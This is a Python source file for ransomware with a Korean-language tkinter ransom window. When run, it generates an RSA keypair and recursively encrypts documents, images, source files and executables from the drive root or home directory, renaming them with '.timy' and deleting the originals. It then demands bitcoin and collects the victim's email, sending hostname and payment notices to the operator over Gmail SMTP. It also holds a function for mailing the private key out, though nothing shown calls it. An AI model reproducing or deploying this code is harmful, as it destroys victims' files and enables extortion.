# -*- coding: utf-8 -*- 
import rsa
from rsa.bigfile import *
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import socket
import sys
import webbrowser
import platform
from tkinter import *
from tkinter import filedialog
from tkinter import messagebox
from validate_email import validate_email


description = "당신은 랜섬웨어에 감염되었습니다.\n해당 랜섬웨어는 RSA 암호화 알고리즘을 사용해서 \n당신의 컴퓨터에 있는 특정 파일들을 암호화하는 랜섬웨어입니다.\n오른쪽에 보이는 리스트들은 암호화된 파일들의 목록입니다.\n만약 당신이 해당 파일들을 복구하고싶다면\n 리스트 밑에있는 빈 박스를 모두채우고\n 보내기버튼을 눌러주시길 바랍니다.\n입력한 메일주소로 복호화 툴이 전송될 것입니다."
string_platform = platform.platform()
if string_platform.find("Windows") != -1:
    description = "당신은 랜섬웨어에 감염되었습니다.\n해당 랜섬웨어는 RSA 암호화 알고리즘을 사용해서 \n당신의 컴퓨터에 있는 특정 파일들을 암호화하는\n 랜섬웨어입니다.오른쪽에 보이는 리스트들은\n 암호화된 파일들의 목록입니다. 당신이 위 파일들을\n 복구하고싶다면 리스트 밑에있는 빈 박스를\n 모두채우고 보내기버튼을 눌러주시길 바랍니다.\n입력한 메일주소로 복호화 툴이 전송될 것입니다."

description2 = "비트코인은 전자화폐의 일종입니다.\n다음 주소에서 자세한 정보를 얻을 수 있습니다.\nhttps://ko.wikipedia.org/wiki/비트코인"

str_lblEmail = "당신의 이메일주소 : "

str_lblBtCTitle = "비트코인 입금 주소"

str_BTCaccount = ""

str_msgContent = "비트코인 입금시도, 확인바람"

str_btnSend = "보내기"

str_btnDecrypt = "암호화 풀기"

decryptBtnClickMsgBoxTitle = "경고창"

decryptBtnClickMsgBoxContent = "반드시 복호화 키 파일(*.pem)을 선택하셔야합니다."

str_lbl_privkey = "  복호화 키 :  "

str_lbl_privkeyContent = ""

str_lbl_encrypted_list_title = "- 암호화된 파일들의 목록 -"

str_lbl_space2 = "복사 : 마우스 클릭 후 CTRL + C"

str_webbrowserAddress = "https://ko.wikipedia.org/wiki/비트코인"

Encrypted_file_list = []

str_email_sender = ''
str_email_sender_pwd = ''


def rtn_dir():
    string_platform = platform.platform()
    if string_platform.find("Windows") != -1:
        return "C:\\"
    else:
        return "~"

def rtn_lblBTCaccount_width():
    string_platform = platform.platform()
    if string_platform.find("Windows") != -1:
        return 33
    else:
        return 34
    
def rtn_poolsize():
    string_platform = platform.platform()
    if string_platform.find("Windows") != -1:
        return 1
    else:
        return 2

def rtn_lbl_privkeyContent_width():
    string_platform = platform.platform()
    if string_platform.find("Windows") != -1:
        return 31
    elif string_platform.find("Linux") != -1:
        return 32
    else:
        return 32
def rtn_lbl_privkey_width():
    string_platform = platform.platform()
    if string_platform.find("Windows") != -1:
        return 9
    elif string_platform.find("Linux") != -1:
        return 6
    else:
        return 6

def rtn_lblEmail_width():
    string_platform = platform.platform()
    if string_platform.find("Windows") != -1:
        return 15
    elif string_platform.find("Linux") != -1:
        return 12
    else:
        return 12

def rtn_text_width():
    string_platform = platform.platform()
    if string_platform.find("Windows") != -1:
        return 37
    elif string_platform.find("Linux") != -1:
        return 47
    else:
        return 47

def check_email(receiverEmail):
    if validate_email(receiverEmail):
        return True
    else:
        return False

def send_email2(receiver,msg):
    sender = str_email_sender
    password = str_email_sender_pwd
    computer_hostname = socket.gethostname()
    msg = MIMEText(msg+"\n\nTo "+receiver)
    msg['Subject'] = computer_hostname + "send bitcoin, CHECK!"
    msg['From'] = sender
    msg['To'] = sender

    
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.ehlo()
    server.login(sender,password)
    server.sendmail(sender,receiver,msg.as_string())
    server.close()

def send_email(privkey):
    sender = str_email_sender
    receiver = str_email_sender
    password = str_email_sender_pwd
    computer_hostname = socket.gethostname()
    msg = MIMEMultipart()
    msg['Subject'] = "PrivateKey From : " + computer_hostname
    msg['From'] = sender
    msg['To'] = receiver

    attach = computer_hostname + '_private000.pem'
    out = open(attach,'wb')
    out.write(privkey)
    out.close()
    
    part = MIMEBase('application', 'outer-stream')
    part.set_payload(open(attach,'rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    
    msg.attach(part)
    
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.ehlo()
    server.login(sender,password)
    server.sendmail(sender,receiver,msg.as_string())
    server.close()
    os.remove(attach)
    


def censor_ext(filename, mode):
    if mode == "enc":
        extension = ['hwp','zip','7z','doc','docx','ppt','xlsx','pages','py','html','c','java','js','txt','pdf','pptx','exe','mp3','mp4','mkv','avi','jpg','jpeg','png','ogg']
    if mode == "dec":
        extension = ['timy']
    ext = os.path.splitext(filename)[-1]
    ext = ext.strip('.')
    ext = ext.lower()
    if ext in extension:
        return TRUE
    return FALSE

def search(key,dirname,mode):
    try:
        filenames = os.listdir(dirname)
        for filename in filenames:
            full_filename = os.path.join(dirname, filename)
            if os.path.isdir(full_filename):
                search(key,full_filename,mode)
            else:
                if censor_ext(full_filename,mode) == FALSE:
                    continue
                if mode == "enc":
                    encrypt_file(key,full_filename)
                elif mode == "dec":
                    decrypt_file(key,full_filename)
    except PermissionError:
        pass
        
        
def encrypt_file(pubkey, filename):
    with open(filename, 'rb') as infile, open(filename+'.timy','wb') as outfile:
        encrypt_bigfile(infile,outfile,pubkey)
    Encrypted_file_list.append(filename)
    os.remove(filename)
    
def decrypt_file(privkey, filename):
    with open(filename,'rb') as infile, open(filename[:-5],'wb') as outfile:
        decrypt_bigfile(infile,outfile,privkey)    
    os.remove(filename)
    
    

(pubkey, privkey) = rsa.newkeys(512, poolsize=rtn_poolsize()) #키 생성, poolsize는 코어수
#너무 오래걸리면 OpenSSL을 사용할 수 있음, 사이트 참고


file = 'hello Im ransomeware'.encode('utf8')
#encode  file as an UTF-8, RSA module only operates on bute and not on string, so this step is necessary

crypto = rsa.encrypt(file, pubkey)
#encrypt file by public key
#can encrypt less than the key, so 512-bit key can encode 53-byte message

decrypto = rsa.decrypt(crypto, privkey)
#decrypt file by private key

print(decrypto.decode('utf8'))
print('\n')

save_privkey = privkey.save_pkcs1('PEM')

computer_hostname = socket.gethostname()
a = pubkey.save_pkcs1('PEM')
out = open(computer_hostname+'public000.pem','wb')
out.write(a)
out.close()
# start

search(pubkey,rtn_dir(),"enc")

class MyFrame(Frame):
    def __init__(self, master):
        Frame.__init__(self,master)
        
        self.master = master
        self.master.title("랜섬웨어")
        self.grid(columnspan = 2, rowspan = 2)
        
        lbl1 = Label(self, text=description, width = 40, height = 10, relief = GROOVE, underline = 100)
        lbl1.grid(row = 1, column = 0, padx=10, pady=10)
        
        frame2 = Frame(self)
        frame2.grid(row = 1, column = 1)
        
        lbl_encrypted_list_title = Label(frame2, text = str_lbl_encrypted_list_title)
        lbl_encrypted_list_title.pack()
        
        encrypted_list_scrollbar = Scrollbar(frame2, orient = VERTICAL)
        encrypted_list = Listbox(frame2, width = 40, height = 8, yscrollcommand = encrypted_list_scrollbar.set)
        Encrypted_file_list.sort()
        for index in range(1,len(Encrypted_file_list)):
            encrypted_list.insert(index,Encrypted_file_list[index-1])
        encrypted_list.pack(side = LEFT)
        encrypted_list_scrollbar.pack(side = RIGHT, fill = Y)
        encrypted_list_scrollbar.config(command = encrypted_list.yview)
        
        
        frame3 = Frame(self, width = 40, height = 10, bd = 2, relief = GROOVE)
        frame3.grid(row = 2, column = 0)
        
        def callback(event):
            webbrowser.open_new(str_webbrowserAddress)
        
        text = Text(frame3, width = rtn_text_width(), height = 11)
        text.insert(INSERT,description2)
        text.grid(row = 2, column = 0, padx = 10, pady = 10)
        text.tag_add("hyperlink","3.0","3.34")
        text.tag_config("hyperlink", foreground = "blue")
        text.bind("<Button-1>",callback)
        
        frame4 = Frame(self, width = 40, height = 10)
        frame4.grid(row = 2, column = 1)
        
        frame4_0 = Frame(frame4)
        frame4_0.pack()
        
        lbl_space0 = Label(frame4_0, text = '\n')
        lbl_space0.pack()
        
        frame4_1 = Frame(frame4)
        frame4_1.pack()
        
        lblEmail = Label(frame4_1, text = str_lblEmail, width = rtn_lblEmail_width())
        lblEmail.pack(side = LEFT)
        
        entryEmail = Entry(frame4_1, width = 25)
        entryEmail.pack(side = RIGHT)
        
        frame4_1_1 = Frame(frame4)
        frame4_1_1.pack()
        
        lbl_privkey = Label(frame4_1_1, text=str_lbl_privkey, width = rtn_lbl_privkey_width())
        lbl_privkey.pack(side = LEFT)
        
        lbl_privkeyScrollbar = Scrollbar(frame4_1_1, orient = VERTICAL)
        encrypted_list_scrollbar.pack(side = LEFT)
        lbl_privkeyContent = Listbox(frame4_1_1, width = rtn_lbl_privkeyContent_width(), height = 1, yscrollcommand = lbl_privkeyScrollbar.set, relief = GROOVE)
        lbl_privkeyContent.insert(1,str_lbl_privkeyContent)
        lbl_privkeyContent.pack(side = RIGHT, padx = 3, pady = 10)
        lbl_privkeyScrollbar.config(command = lbl_privkeyContent.xview)
        
        
        frame4_2 = Frame(frame4)
        frame4_2.pack()
        
        
        lblBTCTitle = Label(frame4_2, text = str_lblBtCTitle, width = 15)
        lblBTCTitle.pack()
        
        lblBTCaccount = Listbox(frame4_2, width = rtn_lblBTCaccount_width(), height = 1, relief = GROOVE)
        lblBTCaccount.insert(1,str_BTCaccount)
        lblBTCaccount.pack()
        
        frame4_3 = Frame(frame4)
        frame4_3.pack()
        
        lbl_space2 = Label(frame4_3, text = str_lbl_space2)
        lbl_space2.pack()
        
        frame4_4 = Frame(frame4)
        frame4_4.pack(side = RIGHT)
        
        
        def sendClick():
            msgContent = str_msgContent
            receiverEmail = entryEmail.get()
            if check_email(receiverEmail):
                send_email2(receiverEmail,msgContent)
            
        
        btnSend = Button(frame4_4, text=str_btnSend, command = sendClick, width = 10)
        btnSend.pack(side = RIGHT, pady = 10)
        
    
        def decryptBtnClick():
            path = ""
            root = Tk()
            root.withdraw()
            path = filedialog.askopenfilename()
            path2 = path.lower()
            while path2.endswith('pem')==False:
                if path2 == "":
                    return
                messagebox.showerror(decryptBtnClickMsgBoxTitle, decryptBtnClickMsgBoxContent)
                path = filedialog.askopenfilename()
                path2 = path.lower()
            with open(path, mode='rb') as privatefile:
                keydata = privatefile.read()
            user_privkey = rsa.PrivateKey.load_pkcs1(keydata)
            str_lbl_privkeyContent = str(user_privkey)[11:-1]
            lbl_privkeyContent.delete(0, END)
            lbl_privkeyContent.insert(1,str_lbl_privkeyContent)
            lbl_privkeyContent.update_idletasks()
            search(user_privkey,rtn_dir(),"dec")
            
        
        btnDecrypt = Button(frame4_4, text=str_btnDecrypt, command = decryptBtnClick, width = 10)
        btnDecrypt.pack(side = RIGHT, pady = 10)
        

        
def main():
    root = Tk()
    myframe = MyFrame(root)
    root.mainloop()

if __name__ == '__main__':
    main()
